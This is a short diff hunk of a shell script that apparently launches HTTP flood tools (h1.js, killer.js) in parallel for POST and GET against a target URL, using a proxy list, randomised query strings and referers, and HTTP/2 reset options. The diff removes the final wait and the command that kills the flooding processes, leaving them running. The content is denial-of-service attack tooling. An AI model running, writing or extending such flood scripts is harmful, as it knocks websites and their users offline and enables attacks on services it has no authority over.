@@ -22,6 +22,3 @@ for m in POST GET; do
   node h1.js $m $URL live.txt $TIME 999 10 randomstring=true &
   node killer.js $m $URL $TIME 4 4 live.txt --query 1 --referer rand --http 2 --close --parsed --reset &
 done
-
-wait
-pgrep -f "hmix.js|h1.js|h2.js|http1.js|http2.js|killer.js" | xargs -r kill -9
